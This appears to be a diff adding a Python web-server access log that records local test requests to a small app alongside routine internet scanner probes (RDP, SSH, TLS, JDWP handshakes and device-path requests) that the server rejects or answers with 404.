+127.0.0.1 - - [25/Sep/2024 12:39:13] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [25/Sep/2024 12:39:20] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 12:39:20] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 12:40:18] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 12:40:18] "GET /security_check/123/123 HTTP/1.1" 200 -
+178.159.37.98 - - [25/Sep/2024 13:27:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [25/Sep/2024 13:27:46] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+195.178.110.132 - - [25/Sep/2024 14:48:00] code 400, message Bad request syntax ('SSH-2.0-OpenSSH')
+195.178.110.132 - - [25/Sep/2024 14:48:00] "SSH-2.0-OpenSSH" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [25/Sep/2024 17:42:57] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 17:42:57] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [25/Sep/2024 17:43:04] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 17:43:04] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 17:45:03] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 17:45:03] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [25/Sep/2024 17:45:49] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 17:45:49] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [25/Sep/2024 17:45:57] "GET /idget/1 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 17:45:57] "GET /security_check/1/1 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 17:59:39] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 17:59:51] "GET /idget/test HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 17:59:51] "GET /security_check/test/218218 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 18:02:51] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [25/Sep/2024 18:02:59] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 20:03:26] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 20:03:26] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [25/Sep/2024 20:03:32] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [25/Sep/2024 20:03:32] "GET /security_check/123/123 HTTP/1.1" 200 -
+167.94.145.101 - - [25/Sep/2024 22:06:27] code 400, message Bad request version ('À\x14À')
+167.94.145.101 - - [25/Sep/2024 22:06:27] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03{óÂ>Djãºgy¶\x87t¦\x1c½\x86Ú¬OqÌ/båtó-]s@T \x8eÙ'×l\x04Ý%ì\x86£p¥ÿñb²ô®V©\x01°\x9cbç\x11\x83\x01\x83ÙU\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.145.101 - - [25/Sep/2024 22:06:31] "GET / HTTP/1.1" 200 -
+167.94.145.101 - - [25/Sep/2024 22:06:35] "GET / HTTP/1.1" 200 -
+167.94.145.101 - - [25/Sep/2024 22:06:36] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.145.101 - - [25/Sep/2024 22:06:36] code 505, message Invalid HTTP version (2.0)
+167.94.145.101 - - [25/Sep/2024 22:06:36] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.138.114 - - [25/Sep/2024 22:41:04] "GET / HTTP/1.1" 200 -
+167.94.138.114 - - [25/Sep/2024 22:41:05] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.138.114 - - [25/Sep/2024 22:41:06] code 505, message Invalid HTTP version (2.0)
+167.94.138.114 - - [25/Sep/2024 22:41:06] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+89.248.165.109 - - [26/Sep/2024 00:16:29] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
+89.248.165.109 - - [26/Sep/2024 00:16:29] "\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+167.94.146.57 - - [26/Sep/2024 01:34:04] code 400, message Bad request version ('À\x14À')
+167.94.146.57 - - [26/Sep/2024 01:34:04] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x030\x97´\x06\\ÿ8QÒQP\x9b\x98h\x97°Ë\x8c®\x96î(àÕûÌ\x0cbæ*\x94á ü \x88x\x9c\x17\x00\x0cËëmAgÉ£*\x99ôá\x1dP\x82\x85\x8b\x8djv¢§ÑÚ0\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.146.57 - - [26/Sep/2024 01:34:08] "GET / HTTP/1.1" 200 -
+167.94.146.57 - - [26/Sep/2024 01:34:12] "GET / HTTP/1.1" 200 -
+167.94.146.57 - - [26/Sep/2024 01:34:13] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.146.57 - - [26/Sep/2024 01:34:13] code 505, message Invalid HTTP version (2.0)
+167.94.146.57 - - [26/Sep/2024 01:34:13] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+127.0.0.1 - - [26/Sep/2024 04:37:16] "GET / HTTP/1.1" 200 -
+45.156.130.37 - - [26/Sep/2024 04:56:04] "GET / HTTP/1.1" 200 -
+45.156.130.38 - - [26/Sep/2024 04:56:16] "GET /ext-js/app/common/zld_product_spec.js HTTP/1.1" 404 -
+45.156.130.35 - - [26/Sep/2024 04:56:17] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 -
+45.156.130.35 - - [26/Sep/2024 04:56:30] "GET /api/session/properties HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 06:07:55] "GET / HTTP/1.1" 200 -
+79.124.49.214 - - [26/Sep/2024 07:05:59] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.214 - - [26/Sep/2024 07:05:59] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+198.235.24.117 - - [26/Sep/2024 07:54:50] "GET / HTTP/1.0" 200 -
+154.213.185.206 - - [26/Sep/2024 08:13:21] code 400, message Bad request syntax ('JDWP-Handshake')
+154.213.185.206 - - [26/Sep/2024 08:13:21] "JDWP-Handshake" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [26/Sep/2024 08:42:13] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 08:42:13] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 09:19:14] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 09:19:14] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 09:20:52] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 09:21:08] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 09:21:09] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 09:21:11] "GET / HTTP/1.1" 200 -
+45.84.89.3 - - [26/Sep/2024 09:25:35] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 10:10:21] "GET / HTTP/1.1" 200 -
+115.231.78.7 - - [26/Sep/2024 10:18:14] "GET / HTTP/1.1" 200 -
+115.231.78.7 - - [26/Sep/2024 10:18:14] "GET / HTTP/1.1" 200 -
+115.231.78.7 - - [26/Sep/2024 10:18:14] "GET /favicon.ico HTTP/1.1" 404 -
+115.231.78.7 - - [26/Sep/2024 10:18:14] "GET /robots.txt HTTP/1.1" 404 -
+193.32.162.39 - - [26/Sep/2024 10:41:10] code 400, message Bad request syntax ('SSH-2.0-OpenSSH')
+193.32.162.39 - - [26/Sep/2024 10:41:10] "SSH-2.0-OpenSSH" HTTPStatus.BAD_REQUEST -
+185.234.216.112 - - [26/Sep/2024 10:48:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [26/Sep/2024 10:48:04] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+198.235.24.171 - - [26/Sep/2024 10:53:18] "GET / HTTP/1.1" 200 -
+165.22.197.118 - - [26/Sep/2024 10:59:26] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03òdM_$\x81*÷\x1aÈG?P>ý\x9f\x90\x9d¯Ñ\x99ï&uÀÝÖÈùs\x86¡\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+165.22.197.118 - - [26/Sep/2024 10:59:26] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03òdM_$\x81*÷\x1aÈG?P>ý\x9f\x90\x9d¯Ñ\x99ï&uÀÝÖÈùs\x86¡\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+165.22.197.118 - - [26/Sep/2024 10:59:27] code 400, message Bad request version ('À\x14À')
+165.22.197.118 - - [26/Sep/2024 10:59:27] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x033öëò\x05ú¯ÎlSã\\¿år»ã(i \x82Dl\x11W,N½\x13\x8dÏU\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+165.22.197.118 - - [26/Sep/2024 10:59:27] "GET / HTTP/1.1" 200 -
+157.55.39.225 - - [26/Sep/2024 11:08:09] "GET /robots.txt HTTP/1.1" 404 -
+52.167.144.215 - - [26/Sep/2024 11:08:14] "GET / HTTP/1.1" 200 -
+178.159.37.98 - - [26/Sep/2024 11:09:49] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [26/Sep/2024 11:09:49] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+51.8.223.19 - - [26/Sep/2024 12:18:00] "GET /v2/ HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 12:38:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 13:34:44] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 13:34:44] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 13:34:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 13:34:50] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 13:34:50] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 13:35:41] "GET / HTTP/1.1" 200 -
+3.23.132.121 - - [26/Sep/2024 14:21:50] "GET / HTTP/1.1" 200 -
+79.124.49.214 - - [26/Sep/2024 14:35:02] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.214 - - [26/Sep/2024 14:35:02] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+123.160.221.140 - - [26/Sep/2024 14:48:26] code 400, message Bad request version ('À\x13À')
+123.160.221.140 - - [26/Sep/2024 14:48:26] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03I\x06²ù¼\x99iÀYûøºe-\x83Ud]\x0e\x8d·b8´gÆÝ9dZ8f gÁ\x81i³öòË°©\x19NÖ½\x95g|püé<Z¡\x90T·é¥8'O;\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+123.160.221.140 - - [26/Sep/2024 14:48:37] "GET / HTTP/1.1" 200 -
+123.160.223.73 - - [26/Sep/2024 14:48:42] "GET / HTTP/1.1" 200 -
+123.160.223.72 - - [26/Sep/2024 14:48:43] "GET / HTTP/1.1" 200 -
+111.7.96.154 - - [26/Sep/2024 14:48:46] "GET / HTTP/1.1" 200 -
+111.7.96.154 - - [26/Sep/2024 14:48:46] "GET / HTTP/1.1" 200 -
+111.7.106.105 - - [26/Sep/2024 14:48:47] "GET / HTTP/1.1" 200 -
+111.7.106.104 - - [26/Sep/2024 14:48:47] "GET / HTTP/1.1" 200 -
+123.160.223.74 - - [26/Sep/2024 14:48:47] "GET /favicon.ico HTTP/1.1" 404 -
+111.7.96.154 - - [26/Sep/2024 14:48:50] "GET /favicon.ico HTTP/1.1" 404 -
+111.7.106.105 - - [26/Sep/2024 14:48:51] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 15:59:06] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 15:59:06] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 15:59:10] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 15:59:10] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 16:28:07] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 16:28:08] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 19:01:16] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:01:16] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 19:01:20] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:01:20] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:05:18] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:05:18] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 19:05:24] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:05:24] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:05:44] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:05:44] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:05:52] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:05:52] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:07:47] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:07:47] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 19:07:52] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:07:52] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:54:01] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:54:02] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [26/Sep/2024 19:54:08] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 19:54:08] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [26/Sep/2024 20:40:12] "GET / HTTP/1.1" 200 -
+64.62.197.104 - - [26/Sep/2024 22:11:32] "GET / HTTP/1.1" 200 -
+64.62.197.95 - - [26/Sep/2024 22:11:43] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [27/Sep/2024 01:01:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [27/Sep/2024 01:01:46] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [27/Sep/2024 01:01:49] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [27/Sep/2024 01:01:49] "GET /security_check/123/123 HTTP/1.1" 200 -
